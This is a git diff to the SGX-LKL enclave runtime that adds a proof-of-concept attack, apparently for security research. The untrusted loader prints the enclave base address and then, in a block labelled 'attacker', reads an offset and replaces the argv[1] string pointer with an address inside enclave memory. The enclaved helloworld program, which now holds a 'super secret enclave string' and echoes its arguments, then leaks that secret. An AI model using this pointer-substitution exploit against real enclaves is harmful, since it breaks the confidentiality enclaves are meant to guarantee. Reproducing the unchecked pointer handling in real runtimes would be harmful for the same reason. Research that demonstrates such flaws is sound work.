@@ -1,0 +1,114 @@
+diff --git a/apps/helloworld/Makefile b/apps/helloworld/Makefile
+index 9e67086..5790623 100644
+--- a/apps/helloworld/Makefile
++++ b/apps/helloworld/Makefile
+@@ -40,7 +40,7 @@ $(DISK): $(PROG) $(PROG_NONPIE)
+ 	'
+ 
+ test: $(DISK)
+-	../../build/sgx-lkl-run $(DISK) app/$(PROG)
++	../../build/sgx-lkl-run $(DISK) app/$(PROG) 123 test
+ 
+ test-nonpie: $(DISK)
+ 	SGXLKL_NON_PIE=1 ../../build/sgx-lkl-run $(DISK) app/$(PROG_NONPIE)
+diff --git a/apps/helloworld/helloworld.c b/apps/helloworld/helloworld.c
+index 61edb0c..15779d0 100644
+--- a/apps/helloworld/helloworld.c
++++ b/apps/helloworld/helloworld.c
+@@ -5,9 +5,23 @@
+ 
+ #define HW_FILE "/app/helloworld.txt"
+ 
++char *secret = "super secret enclave string";
++
+ int main(int argc, char **argv)
+ {
+-    char buf[100];
++    int i;
++
++    printf("\n\nHello world from enclaved application binary!\n");
++    printf("\t--> enclave secret at %p\n", secret);
++
++    printf("\n\nEchoing user-provided command line arguments\n");
++
++    for (i=0; i < argc; i++)
++    {
++	printf("\targv[%d] @%p = '%s'\n", i, argv[i], argv[i]);
++    }
++
++    /*char buf[100];
+     FILE *f = fopen(HW_FILE, "r");
+     if (!f) {
+         fprintf(stderr, "Could not open file %s: %s\n", HW_FILE, strerror(errno));
+@@ -21,6 +35,7 @@ int main(int argc, char **argv)
+         fprintf(stderr, "Could not read first line of file %s: %s\n", HW_FILE, strerror(errno));
+         exit(1);
+     }
++    */
+ 
+     return 0;
+ }
+diff --git a/lkl b/lkl
+--- a/lkl
++++ b/lkl
+@@ -1 +1 @@
+-Subproject commit 58dc2025bf469d880d76250e682dd8e4ed225a6b
++Subproject commit 58dc2025bf469d880d76250e682dd8e4ed225a6b-dirty
+diff --git a/src/main/sgxlkl_run.c b/src/main/sgxlkl_run.c
+index 0051772..f8611db 100644
+--- a/src/main/sgxlkl_run.c
++++ b/src/main/sgxlkl_run.c
+@@ -1249,14 +1249,19 @@ int main(int argc, char *argv[], char *envp[]) {
+ 
+     char* enclave_start = mmap(0, lkl_lib_stat.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, lkl_lib_fd, 0);
+ 
++    printf("enclave_start = %p\n", enclave_start);
++
+     init_sgx();
+     if (getenv("SGXLKL_HEAP") || getenv("SGXLKL_KEY")) {
+         if (!getenv("SGXLKL_KEY"))
+             sgxlkl_fail("Heap size but no enclave signing key specified. Please specify a signing key via SGXLKL_KEY.\n");
+         enclave_update_heap(enclave_start, getenv_uint64("SGXLKL_HEAP", DEFAULT_HEAP_SIZE, ULONG_MAX), getenv("SGXLKL_KEY"));
+     }
+-    create_enclave_mem(enclave_start, getenv_bool("SGXLKL_NON_PIE", 0), &__sgxlklrun_text_segment_start);
++    uint64_t ubase = create_enclave_mem(enclave_start, getenv_bool("SGXLKL_NON_PIE", 0), &__sgxlklrun_text_segment_start);
++
++    printf("ubase = %p\n", ubase);
+ 
++    
+     // Check if there are enough TCS for all ethreads.
+     int num_tcs = get_tcs_num();
+     if (num_tcs == 0) sgxlkl_fail("No TCS number specified \n");
+@@ -1282,6 +1287,7 @@ int main(int argc, char *argv[], char *envp[]) {
+ 
+     encl.base = encl_map.base;
+     encl.ifn = encl_map.entry_point;
++
+ #endif
+ 
+     /* Launch system call threads */
+@@ -1303,7 +1309,23 @@ int main(int argc, char *argv[], char *envp[]) {
+ #endif
+ 
+     encl.argc = argc - 2;
+-    encl.argv = (argv + 2);
++    
++    char** argv_encl = argv + 2;
++
++#if 1
++    printf("\n\n------------------------------\n");
++    printf("attacker: enter offset from ubase, current arguments[1]=%p > ", argv_encl[1]);
++    char *adrs = NULL;
++    scanf("%p", &adrs);
++
++    adrs += ubase;
++
++    printf("\nattacker: replacing untrusted string pointer argv[1] with adrs %p\n", adrs);
++    argv_encl[1] = adrs; 
++    printf("------------------------------\n\n\n");
++#endif
++
++    encl.argv = argv_encl;
+ 
+     // Find aux vector (after envp vector)
+     for (auxvp = envp; *auxvp; auxvp++);
